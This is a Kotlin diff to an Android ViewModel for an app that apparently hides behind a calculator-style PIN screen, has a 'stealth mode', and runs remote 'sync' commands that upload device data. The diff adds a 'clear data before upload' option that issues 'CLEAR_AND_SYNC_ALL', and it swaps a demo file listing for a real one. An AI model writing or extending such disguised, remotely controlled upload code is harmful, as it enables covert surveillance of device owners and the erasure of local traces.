@@ -89,6 +89,9 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
     private val _stealthModeEnabled = MutableStateFlow(false)
     val stealthModeEnabled: StateFlow<Boolean> = _stealthModeEnabled.asStateFlow()
 
+    private val _clearDataBeforeUpload = MutableStateFlow(false)
+    val clearDataBeforeUpload: StateFlow<Boolean> = _clearDataBeforeUpload.asStateFlow()
+
     private val _calculatorModeEnabled = MutableStateFlow(true)
     val calculatorModeEnabled: StateFlow<Boolean> = _calculatorModeEnabled.asStateFlow()
 
@@ -109,6 +112,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         val context = getApplication<Application>()
         val prefs = context.getSharedPreferences("admin_sync_prefs", Context.MODE_PRIVATE)
         _stealthModeEnabled.value = prefs.getBoolean("stealth_mode", false)
+        _clearDataBeforeUpload.value = prefs.getBoolean("clear_before_upload", false)
         _calculatorModeEnabled.value = prefs.getBoolean("calculator_mode", true)
         _calculatorPin.value = prefs.getString("calculator_pin", "1234") ?: "1234"
         _isUnlocked.value = !_calculatorModeEnabled.value
@@ -132,17 +136,29 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         } catch (_: Exception) {}
     }
 
-    fun triggerSyncAll() {
+    fun toggleClearDataBeforeUpload(enabled: Boolean) {
+        _clearDataBeforeUpload.value = enabled
+        val context = getApplication<Application>()
+        val prefs = context.getSharedPreferences("admin_sync_prefs", Context.MODE_PRIVATE)
+        prefs.edit().putBoolean("clear_before_upload", enabled).apply()
+    }
+
+    fun triggerSyncAll(clearFirst: Boolean = _clearDataBeforeUpload.value) {
         viewModelScope.launch(Dispatchers.IO) {
             _isSyncing.value = true
             try {
-                commandManager.executeCommand("SYNC_ALL", "Triggered from Dashboard UI")
+                val cmd = if (clearFirst) "CLEAR_AND_SYNC_ALL" else "SYNC_ALL"
+                commandManager.executeCommand(cmd, "Triggered from Dashboard UI")
                 _lastSyncTime.value = System.currentTimeMillis()
             } catch (_: Exception) {
             } finally {
                 _isSyncing.value = false
             }
         }
+    }
+
+    fun triggerClearAndBackupNow() {
+        triggerSyncAll(clearFirst = true)
     }
 
     fun executeRemoteCommand(commandType: String, payload: String = "") {
@@ -232,14 +248,18 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 }?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyList()
                 _fileList.value = items
             } else {
-                // Demo fallback file listing if directory restricted
-                _currentDirectory.value = "/storage/emulated/0/EnterpriseData"
-                _fileList.value = listOf(
-                    FileItem("Telemetry_Backup.json", "/storage/emulated/0/EnterpriseData/Telemetry_Backup.json", false, 1048576, System.currentTimeMillis()),
-                    FileItem("Logs", "/storage/emulated/0/EnterpriseData/Logs", true, 0, System.currentTimeMillis()),
-                    FileItem("Device_Policies.xml", "/storage/emulated/0/EnterpriseData/Device_Policies.xml", false, 4096, System.currentTimeMillis()),
-                    FileItem("Encrypted_Database.db", "/storage/emulated/0/EnterpriseData/Encrypted_Database.db", false, 5242880, System.currentTimeMillis())
-                )
+                val appFilesDir = getApplication<Application>().filesDir
+                _currentDirectory.value = appFilesDir.absolutePath
+                val items = appFilesDir.listFiles()?.map { f ->
+                    FileItem(
+                        name = f.name,
+                        path = f.absolutePath,
+                        isDirectory = f.isDirectory,
+                        sizeBytes = if (f.isFile) f.length() else 0L,
+                        lastModified = f.lastModified()
+                    )
+                }?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyList()
+                _fileList.value = items
             }
         }
     }
